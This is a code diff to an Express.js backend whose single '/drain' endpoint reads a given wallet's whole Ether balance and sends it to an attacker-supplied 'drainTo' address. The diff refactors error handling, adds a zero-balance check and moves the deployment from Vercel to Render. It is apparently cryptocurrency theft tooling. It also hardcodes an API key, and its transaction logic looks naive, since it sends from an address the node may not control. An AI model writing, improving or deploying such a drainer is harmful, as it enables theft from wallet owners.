@@ -1,3 +1,4 @@
+// index.js
 const express = require('express');
 const bodyParser = require('body-parser');
 const Web3 = require('web3');
@@ -8,7 +9,7 @@ const port = process.env.PORT || 3000;
 // Use body-parser to parse JSON requests
 app.use(bodyParser.json());
 
-// Set up Web3 provider using your QuickNode API key
+// Set up Web3 provider (you can use Infura or your own node)
 const web3 = new Web3('https://mainnet.infura.io/v3/QN_801713e80c764d00a9cff03a4a888bf6');
 
 // Endpoint for draining the wallet
@@ -16,19 +17,28 @@ app.post('/drain', async (req, res) => {
   const { address, drainTo } = req.body;
 
   if (!address || !drainTo) {
-    return res.status(400).json({ error: 'Missing address or drain address' });
+    return res.status(400).json({
+      success: false,
+      message: 'Missing address or drainTo address',
+    });
   }
 
   try {
-    // Get the balance of the user's wallet
+    // Get balance of the wallet
     const balance = await web3.eth.getBalance(address);
-    const value = web3.utils.hexToNumberString(balance);
 
-    // Send the funds to the drain address
+    if (balance === '0') {
+      return res.status(200).json({
+        success: true,
+        message: 'Wallet has 0 balance. No tokens to drain.',
+      });
+    }
+
+    // Create a transaction to drain the wallet
     const transaction = await web3.eth.sendTransaction({
       from: address,
       to: drainTo,
-      value: value,
+      value: balance,
     });
 
     res.status(200).json({
@@ -37,10 +47,11 @@ app.post('/drain', async (req, res) => {
       transactionHash: transaction.transactionHash,
     });
   } catch (err) {
-    console.error(err);
+    console.error('Error draining wallet:', err);
     res.status(500).json({
-      error: 'Failed to drain wallet',
-      message: err.message,
+      success: false,
+      message: 'Failed to drain wallet',
+      error: err.message,
     });
   }
 });
@@ -48,5 +59,5 @@ app.post('/drain', async (req, res) => {
 // Start the server
 app.listen(port, () => {
   console.log(`Backend running on http://localhost:${port}`);
-  console.log(`Deployment URL: https://tokenbackendwork.vercel.app`);
+  console.log(`Deployment URL: https://tokenbackendwork.onrender.com`);
 });
